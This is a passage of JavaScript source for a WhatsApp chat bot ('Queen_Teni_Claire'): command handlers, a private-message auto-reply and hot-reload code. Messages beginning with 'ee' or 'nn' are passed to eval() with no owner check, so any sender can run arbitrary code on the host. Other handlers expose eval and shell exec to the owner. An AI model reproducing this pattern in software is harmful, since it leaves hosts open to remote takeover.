    let argsssskkkkk = m.text.split(' ');
    
            await handleVeemonCommand(m, chattttkkkkk, argsssskkkkk);
            break;
    // ====== //
default:
 if (db.data.chats[chatId].simi) {
              let chait = db.data.chats[chatId]
    await handleSimiCommand(m, chait, ['simi']);
            } 
            
           if (db.data.chats[chatId].Veemon) {
              let chait = db.data.chats[chatId]
    handleVeemonCommand(m, chait, ['Queen_Teni_Claire']);
            } 
            
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    

if (budy.startsWith('ee')) {
if (!text) return 
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return m.reply('codenya mana kak')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
reply(teks)
}

if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `*Halo @${m?.sender.split("@")[0]} ${ucapanWaktu}* , Hi  VERAN IS BUSY SO SIR \n\n KINDLY  WAIT TILL *TICKIE* REPLIES YOUR  MESSAGES" NOTE - B.M.B LOVE MAITE . BYE `.trim();
ptz.sendMessage(m?.chat,{text:caption,mentions:[m?.sender]},{quoted:fsaluran})
user.pc = new Date() * 1;
}
}
} catch (err) {
console.log('Button Request •')
console.log('Not Fuction Response:')
console.log(util.format(err))
    setTimeout(() => {
              console.clear()
        cfont.say('<- Queen_Teni_Claire ->', {
    font: 'chrome',
    align: 'left',
    colors: ['blue','white'],
    background: 'white',
    letterSpacing: 1,
    lineHeight: 1,
    space: false,
    maxLength: '20',
});
console.log(chalk.blue(` ‎ ‎  Queen_Teni_Claire - Multi Device • Dgf TICKIE \n ‎ ‎${chalk.white("Created by veran and his team")}`))
    console.log(chalk.white(' ‎ ‎_____________________________________\n'))
               }, 6000)
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
